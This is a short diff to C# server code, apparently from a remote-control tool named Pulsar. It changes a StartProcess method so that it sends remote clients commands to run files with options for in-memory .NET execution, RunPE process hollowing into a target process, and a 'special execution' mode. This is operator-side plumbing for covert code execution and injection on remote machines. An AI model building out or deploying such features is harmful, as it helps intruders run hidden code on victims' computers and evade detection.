@@ -405,19 +405,48 @@ namespace Pulsar.Server.Messages
             });
         }
 
-        public void StartProcess(string remotePath)
+        // =========================
+        // SIMPLE OVERLOAD (FileManager uses this)
+        // =========================
+        public void StartProcess(string filePath)
+        {
+            StartProcess(
+                filePath,
+                isUpdate: false,
+                executeInMemory: false,
+                useRunPE: false,
+                runPETarget: "a",
+                runPECustomPath: null,
+                useSpecialExecution: false
+            );
+        }
+
+        // =========================
+        // FULL FEATURE VERSION
+        // =========================
+        public void StartProcess(string filePath,
+                                 bool isUpdate,
+                                 bool executeInMemory,
+                                 bool useRunPE,
+                                 string runPETarget,
+                                 string runPECustomPath,
+                                 bool useSpecialExecution)
         {
             _client.Send(new DoProcessStart
             {
-                FilePath = remotePath,
-                IsFromFileManager = true,
-                ExecuteInMemoryDotNet = false,
-                UseRunPE = false,
-                IsUpdate = false,
-                FileBytes = null,
-                DownloadUrl = null
+                FilePath = filePath,
+                IsUpdate = isUpdate,
+                ExecuteInMemoryDotNet = executeInMemory,
+                UseRunPE = useRunPE,
+                RunPETarget = runPETarget,
+                RunPECustomPath = runPECustomPath,
+                UseSpecialExecution = useSpecialExecution,
+                IsFromFileManager = true,  // ← ADD THIS LINE
+                FileExtension = Path.GetExtension(filePath)  // ← Also add this if needed
             });
         }
+
+
 
         public void AddToStartup(StartupItem item)
         {
